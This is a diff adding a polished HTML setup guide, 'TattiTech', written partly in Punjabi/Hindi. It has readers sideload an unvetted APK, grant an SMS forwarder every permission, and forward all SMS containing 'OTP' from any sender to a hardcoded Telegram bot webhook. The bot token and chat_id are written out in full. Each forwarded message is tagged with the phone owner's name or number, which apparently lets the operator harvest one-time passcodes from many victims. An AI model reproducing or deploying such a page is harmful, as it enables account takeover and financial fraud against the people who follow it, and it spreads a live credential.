@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TattiTech — SMS Forwarder Setup & APK Download</title>
+<meta name="description" content="TattiTech — Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step professional guide.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#06060d;
+    --bg-card:#0e0e1a;
+    --bg-card-2:#11111f;
+    --border:#ffffff0d;
+    --border-hover:#00e5ff33;
+    --text:#eef0f8;
+    --text-dim:#9494ab;
+    --accent:#00e5ff;
+    --accent-2:#00ff9d;
+    --accent-3:#7b5cff;
+    --green:#2ecc71;
+    --radius:18px;
+    --radius-sm:12px;
+    --font:'Inter', system-ui, -apple-system, sans-serif;
+    --mono:'JetBrains Mono', 'Courier New', monospace;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { scroll-behavior:smooth; -webkit-text-size-adjust:100%; }
+
+  body {
+    font-family:var(--font);
+    background:var(--bg);
+    color:var(--text);
+    line-height:1.65;
+    overflow-x:hidden;
+    font-feature-settings:"cv02","cv03","cv04","cv11";
+    -webkit-font-smoothing:antialiased;
+  }
+
+  body::before {
+    content:'';
+    position:fixed; inset:-20%; z-index:-1;
+    background:
+      radial-gradient(circle at 15% 15%, #00e5ff1a, transparent 45%),
+      radial-gradient(circle at 85% 75%, #7b5cff1a, transparent 45%),
+      radial-gradient(circle at 50% 110%, #00ff9d14, transparent 45%);
+    animation:ambient 18s ease-in-out infinite alternate;
+  }
+  @keyframes ambient {
+    0%   { transform:translate(0,0) scale(1); }
+    100% { transform:translate(-3%,-3%) scale(1.12); }
+  }
+
+  header {
+    text-align:center;
+    padding:88px 24px 48px;
+    position:relative;
+  }
+  .logo-mark {
+    width:64px; height:64px;
+    margin:0 auto 24px;
+    display:grid; place-items:center;
+    border-radius:18px;
+    background:linear-gradient(135deg,#00e5ff22,#7b5cff22);
+    border:1px solid #00e5ff33;
+    font-size:1.8rem;
+    animation:float 4s ease-in-out infinite;
+    box-shadow:0 8px 40px #00e5ff1a;
+  }
+  @keyframes float {
+    0%,100% { transform:translateY(0); }
+    50%     { transform:translateY(-6px); }
+  }
+  header h1 {
+    font-size:clamp(2.4rem, 6vw, 4rem);
+    font-weight:900;
+    letter-spacing:-2px;
+    line-height:1.05;
+    background:linear-gradient(100deg,#00e5ff,#7b5cff,#00ff9d,#00e5ff);
+    background-size:300% auto;
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+    animation:shine 7s linear infinite;
+  }
+  @keyframes shine { to { background-position:300% center; } }
+  header .tagline {
+    color:var(--text-dim);
+    font-size:clamp(0.95rem, 2vw, 1.1rem);
+    margin-top:14px;
+    font-weight:500;
+    max-width:520px;
+    margin-left:auto; margin-right:auto;
+  }
+  .pills {
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px;
+    justify-content:center;
+    margin-top:26px;
+  }
+  .pill {
+    padding:8px 18px;
+    border:1px solid #00e5ff33;
+    border-radius:50px;
+    font-size:0.82rem;
+    font-weight:600;
+    color:var(--accent);
+    background:#00e5ff0d;
+    letter-spacing:0.3px;
+  }
+  .pill.green { color:var(--accent-2); border-color:#00ff9d33; background:#00ff9d0d; }
+  .pill.purple { color:var(--accent-3); border-color:#7b5cff33; background:#7b5cff0d; }
+
+  .container { max-width:780px; margin:0 auto; padding:0 24px 100px; }
+
+  .section-label {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin:48px 0 20px;
+    font-size:0.78rem;
+    font-weight:700;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--text-dim);
+  }
+  .section-label::after {
+    content:'';
+    flex:1;
+    height:1px;
+    background:linear-gradient(90deg,var(--border),transparent);
+  }
+
+  .card {
+    background:linear-gradient(160deg,var(--bg-card),var(--bg-card-2));
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    padding:30px;
+    margin:20px 0;
+    box-shadow:0 10px 50px #00000055, inset 0 1px 0 #ffffff08;
+    transition:transform .35s cubic-bezier(.4,0,.2,1),
+               border-color .35s ease,
+               box-shadow .35s ease;
+    position:relative;
+    overflow:hidden;
+  }
+  .card::before {
+    content:'';
+    position:absolute; top:0; left:0; right:0;
+    height:1px;
+    background:linear-gradient(90deg,transparent,#ffffff22,transparent);
+  }
+  .card:hover {
+    transform:translateY(-5px);
+    border-color:var(--border-hover);
+    box-shadow:0 20px 60px #00e5ff14, inset 0 1px 0 #ffffff10;
+  }
+  .card-header {
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin-bottom:6px;
+  }
+  .card-icon {
+    width:44px; height:44px;
+    flex-shrink:0;
+    display:grid; place-items:center;
+    border-radius:12px;
+    background:#00e5ff14;
+    border:1px solid #00e5ff26;
+    font-size:1.25rem;
+  }
+  .card-icon.green { background:#00ff9d14; border-color:#00ff9d26; }
+  .card-icon.purple { background:#7b5cff14; border-color:#7b5cff26; }
+  .card h2 {
+    font-size:1.28rem;
+    font-weight:800;
+    letter-spacing:-0.3px;
+  }
+  .card .sub {
+    color:var(--text-dim);
+    font-size:0.88rem;
+    font-weight:500;
+    margin-left:58px;
+    margin-bottom:16px;
+  }
+
+  .app-img {
+    display:block;
+    margin:0 auto 16px;
+    width:84px; height:84px;
+    border-radius:20px;
+    object-fit:contain;
+    background:#ffffff08;
+    padding:10px;
+    border:1px solid #ffffff10;
+    transition:transform .45s cubic-bezier(.4,0,.2,1);
+  }
+  .app-img:hover { transform:scale(1.08) rotate(4deg); }
+
+  .btn {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    width:100%;
+    padding:16px;
+    border-radius:var(--radius-sm);
+    font-family:var(--font);
+    font-weight:700;
+    font-size:0.98rem;
+    text-decoration:none;
+    border:none;
+    cursor:pointer;
+    transition:transform .2s cubic-bezier(.4,0,.2,1),
+               box-shadow .3s ease,
+               filter .2s ease;
+    margin-top:16px;
+    letter-spacing:0.2px;
+  }
+  .btn:active { transform:scale(0.98); }
+  .btn-primary {
+    background:linear-gradient(135deg,#00e5ff,#00b8d4);
+    color:#001014;
+    box-shadow:0 8px 28px #00e5ff33;
+  }
+  .btn-primary:hover {
+    transform:translateY(-2px);
+    box-shadow:0 14px 40px #00e5ff4d;
+    filter:brightness(1.08);
+  }
+  .btn-green {
+    background:linear-gradient(135deg,#2ecc71,#27ae60);
+    color:#001a0d;
+    box-shadow:0 8px 28px #2ecc7133;
+  }
+  .btn-green:hover {
+    transform:translateY(-2px);
+    box-shadow:0 14px 40px #2ecc714d;
+    filter:brightness(1.08);
+  }
+
+  .step {
+    background:#08080f;
+    border:1px solid #ffffff08;
+    border-left:3px solid var(--accent);
+    border-radius:var(--radius-sm);
+    padding:18px 20px;
+    margin:12px 0;
+    font-size:0.94rem;
+    transition:border-color .3s ease, background .3s ease, transform .2s ease;
+  }
+  .step:hover {
+    border-left-color:var(--accent-2);
+    background:#0a0a14;
+    transform:translateX(3px);
+  }
+  .step-title {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:700;
+    color:var(--accent);
+    margin-bottom:6px;
+    font-size:0.95rem;
+  }
+  .step-num {
+    display:inline-grid;
+    place-items:center;
+    width:24px; height:24px;
+    flex-shrink:0;
+    border-radius:50%;
+    background:linear-gradient(135deg,#00e5ff,#00b8d4);
+    color:#001014;
+    font-weight:800;
+    font-size:0.78rem;
+  }
+  .step p { color:var(--text); }
+
+  .codebox {
+    background:#04040a;
+    color:var(--accent-2);
+    padding:16px 18px;
+    border-radius:10px;
+    font-family:var(--mono);
+    font-size:0.84rem;
+    line-height:1.7;
+    white-space:pre-wrap;
+    word-break:break-all;
+    margin-top:12px;
+    border:1px solid #00ff9d1f;
+    overflow-x:auto;
+    transition:border-color .3s ease;
+  }
+  .codebox:hover { border-color:#00ff9d40; }
+
+  .copybtn {
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    background:#00e5ff14;
+    color:var(--accent);
+    border:1px solid #00e5ff40;
+    padding:9px 18px;
+    border-radius:9px;
+    cursor:pointer;
+    font-family:var(--font);
+    font-weight:700;
+    font-size:0.82rem;
+    margin-top:12px;
+    transition:all .2s ease;
+  }
+  .copybtn:hover {
+    background:var(--accent);
+    color:#001014;
+    border-color:var(--accent);
+    transform:translateY(-1px);
+  }
+  .copybtn:active { transform:scale(0.96); }
+
+  .note {
+    background:linear-gradient(135deg,#ffcc000d,#ff88000d);
+    border:1px solid #ffcc0033;
+    border-radius:var(--radius-sm);
+    padding:18px 20px;
+    margin:16px 0;
+    font-size:0.9rem;
+    color:#ffd966;
+    line-height:1.7;
+  }
+  .note b { color:#ffcc00; }
+  .note code {
+    display:inline-block;
+    background:#00000055;
+    color:var(--accent-2);
+    padding:3px 10px;
+    border-radius:6px;
+    font-family:var(--mono);
+    font-size:0.82rem;
+    margin:2px 0;
+  }
+
+  .hl { color:var(--accent); font-weight:700; }
+  .hl-green { color:var(--accent-2); font-weight:700; }
+
+  .divider {
+    height:1px;
+    background:linear-gradient(90deg,transparent,#00e5ff33,transparent);
+    margin:12px 0;
+  }
+
+  footer {
+    text-align:center;
+    padding:48px 24px;
+    color:#55556a;
+    font-size:0.84rem;
+    border-top:1px solid var(--border);
+    background:#04040a;
+  }
+  footer .brand {
+    font-weight:800;
+    color:var(--accent);
+    letter-spacing:-0.3px;
+  }
+  footer p + p { margin-top:6px; }
+
+  .toast {
+    position:fixed;
+    bottom:32px; left:50%;
+    transform:translateX(-50%) translateY(120px);
+    background:linear-gradient(135deg,#00ff9d,#00cc7a);
+    color:#001a0d;
+    padding:14px 30px;
+    border-radius:50px;
+    font-weight:800;
+    font-size:0.92rem;
+    box-shadow:0 12px 40px #00ff9d55;
+    opacity:0;
+    transition:all .45s cubic-bezier(.4,0,.2,1);
+    z-index:1000;
+    pointer-events:none;
+  }
+  .toast.show {
+    transform:translateX(-50%) translateY(0);
+    opacity:1;
+  }
+
+  @media (max-width:600px) {
+    header { padding:64px 20px 32px; }
+    .container { padding:0 18px 80px; }
+    .card { padding:24px 20px; }
+    .card .sub { margin-left:0; }
+    .card-header { align-items:flex-start; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      animation-duration:0.01ms !important;
+      animation-iteration-count:1 !important;
+      transition-duration:0.01ms !important;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo-mark">⚡</div>
+  <h1>TattiTech</h1>
+  <p class="tagline">APK Download &amp; SMS Forwarder Setup — Telegram OTP Forwarding Guide</p>
+  <div class="pills">
+    <span class="pill">⚡ 2 Methods</span>
+    <span class="pill green">✓ Step-by-Step</span>
+    <span class="pill purple">🔒 Telegram Webhook</span>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- ========== METHOD 1 ========== -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon">📱</div>
+      <h2>Method 1 — Direct APK</h2>
+    </div>
+    <p class="sub">File: app-release.apk • Size: 2.5 MB</p>
+    <img src="2.png" alt="APK Logo" class="app-img">
+    <a class="btn btn-primary" href="app-release.apk" download>
+      ⬇ Download app-release.apk
+    </a>
+    <div class="note">
+      Download karo → <b>Install</b> karo. Agar "Install blocked" aaye ta
+      Settings → <b>Install unknown apps</b> → Browser nu <b>Allow</b> karo.
+    </div>
+  </div>
+
+  <!-- ========== METHOD 2 ========== -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon green">🛒</div>
+      <h2>Method 2 — F-Droid</h2>
+    </div>
+    <p class="sub">Agar Method 1 fail ho jaye • Size: 12 MB</p>
+    <img src="3.png" alt="F-Droid Logo" class="app-img">
+    <a class="btn btn-green" href="F-Droid.apk" download>
+      ⬇ Download F-Droid.apk
+    </a>
+    <div class="step">
+      <div class="step-title"><span class="step-num">1</span> Install F-Droid</div>
+      <p><b>F-Droid.apk</b> download karo aur install karo.</p>
+    </div>
+    <div class="step">
+      <div class="step-title"><span class="step-num">2</span> Search SMS Forwarder</div>
+      <p>F-Droid kholo → Search bar vich <span class="hl">"SMS Forwarder"</span> search karo.</p>
+    </div>
+    <div class="step">
+      <div class="step-title"><span class="step-num">3</span> Install App</div>
+      <p>App install karo ✅</p>
+    </div>
+  </div>
+
+  <div class="section-label">SMS Forwarder Setup</div>
+
+  <!-- ========== SETUP ========== -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon purple">⚙️</div>
+      <h2>SMS Forwarder Configuration</h2>
+    </div>
+    <p class="sub">App download ho jaye (Method 1 ya 2) → phir eh setup karo</p>
+
+    <img src="1.png" alt="SMS Forwarder Logo" class="app-img">
+
+    <!-- Step 1 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">1</span> Permissions</div>
+      <p>App kholo → <span class="hl">saari permissions de do</span> (SMS, Storage, Notification, Battery optimization ignore).</p>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">2</span> New Rule</div>
+      <p><b>+</b> icon te click karo (naya rule banao).</p>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">3</span> Sender</div>
+      <p>Sender field vich eh symbol pao:</p>
+      <div class="codebox" id="sender">*</div>
+      <button class="copybtn" onclick="copyCode('sender')">📋 Copy Sender</button>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">4</span> Text Filter</div>
+      <p>Text filter field vich eh likho:</p>
+      <div class="codebox" id="filter">OTP</div>
+      <button class="copybtn" onclick="copyCode('filter')">📋 Copy Filter</button>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">5</span> Webhook URL</div>
+      <p>Webhook URL field vich eh link pao:</p>
+      <div class="codebox" id="webhook">https://api.telegram.org/bot8962351328:AAGf-zO6MCrjyKOcKpvXmo9hrjUYjYFEOhQ/sendMessage?chat_id=8672281950</div>
+      <button class="copybtn" onclick="copyCode('webhook')">📋 Copy Webhook URL</button>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">6</span> JSON Payload Template</div>
+      <p>Advanced parameter kholo → JSON payload template vich eh paste karo:</p>
+      <div class="codebox" id="json">{
+  "chat_id": "8672281950",
+  "text": "📩 %from%\n📞 %fromNumber%\n📲 Prince\n🔑 %text%\n⏰ %sentStamp=dd-MM-yyyy HH:mm%"
+}</div>
+      <button class="copybtn" onclick="copyCode('json')">📋 Copy JSON</button>
+
+      <div class="note" style="margin-top:18px;">
+        <b>⚠️ ZAROORI — Eh padho:</b><br><br>
+        JSON vich jithe <span class="hl-green">"Prince"</span> likhya hai, othe tusi
+        <b>apna naam YA apna mobile number</b> likhna hai — jis phone vich eh activity ho rahi hai.
+        <br><br>
+        <b>Example 1 — Naam:</b><br>
+        <code>"📲 Maninder"</code>
+        <br><br>
+        <b>Example 2 — Mobile Number:</b><br>
+        <code>"📲 +919876543210"</code>
+        <br><br>
+        <b>Example 3 — Dono:</b><br>
+        <code>"📲 Maninder (+919876543210)"</code>
+        <br><br>
+        👉 <b>Jis phone vich OTP aayega, us phone te oh phone da naam ya number likho.</b>
+        Telegram te message vich ehhi dikhega — taaki pata lage kis number/phone te OTP aaya.
+      </div>
+    </div>
+
+    <!-- Step 7 -->
+    <div class="step">
+      <div class="step-title"><span class="step-num">7</span> Test &amp; Save</div>
+      <p>Niche <b>Test</b> button te click karo → phir <b>Save</b> button te click karo. Done ✅</p>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2026 <span class="brand">TattiTech</span> — SMS Forwarder Setup Guide</p>
+  <p>Made with 💙 for easy OTP forwarding</p>
+</footer>
+
+<div class="toast" id="toast">✅ Copied!</div>
+
+<script>
+function copyCode(id) {
+  const el = document.getElementById(id);
+  const text = el.innerText;
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(() => showToast('✅ Copied!'))
+      .catch(() => fallbackCopy(text));
+  } else {
+    fallbackCopy(text);
+  }
+}
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.select();
+  try { document.execCommand('copy'); showToast('✅ Copied!'); }
+  catch(e) { showToast('❌ Copy failed'); }
+  document.body.removeChild(ta);
+}
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._timer);
+  t._timer = setTimeout(() => t.classList.remove('show'), 1900);
+}
+</script>
+
+</body>
+</html>
